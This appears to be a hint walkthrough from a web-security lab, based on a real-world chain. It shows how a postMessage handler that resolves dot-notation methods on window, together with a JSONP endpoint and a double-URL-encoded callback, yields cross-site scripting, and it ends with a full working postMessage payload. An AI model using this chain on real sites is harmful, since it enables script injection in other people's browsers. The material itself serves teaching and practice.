Hint: Method Dispatch via postMessage

The page has a postMessage handler that traverses object properties via dot notation and calls the result as a function. Combined with a JSONP endpoint, this becomes XSS. Based on jub0bs' real-world chain.
1
Find the handler›
Beautify the minified code. The addEventListener('message', ...) handler parses JSON, splits method on ".", then walks the resulting path on window: 
var r = t.method.split(".");
var n = window;
for (var a = 0; a < r.length; a++) {
  n = n[r[a]];
}
n(t.arg); // Calls the resolved function!
So method: "APP.apiCall" resolves to window.APP.apiCall and calls it with arg.
2
What does apiCall do?›
APP.apiCall(url) creates a <script> tag with src = searchEndpoint + url. The search endpoint supports JSONP via ?output=jsonp&callback=.... You control the callback via the arg parameter.
3
The JSONP endpoint›
/api/jsonp/search accepts callback and output=jsonp. The callback value becomes the function name wrapping the JSON. If you set callback=alert, the response is alert({...}). For actual XSS: use double URL-encoding to get arbitrary JS: callback=alert%2528document.domain%2529%252f%252f
4
Build the arg string›
apiCall prepends the search endpoint to your arg. So your arg should look like: &callback=alert%2528document.domain%2529%252f%252f&output=jsonp#. The # at the end cuts off the rest. The full URL becomes the JSONP endpoint with your callback.

In this page's DevTools console:

postMessage(JSON.stringify({
  method: "APP.apiCall",
  arg: "&callback=alert%2528%2527XSS%2527%2529%252f%252f&output=jsonp#"
}), '*');

Flow: handler resolves APP.apiCall → creates script tag → script loads JSONP endpoint → callback is double-decoded to alert('XSS')// → wraps the JSON → script executes → alert fires.
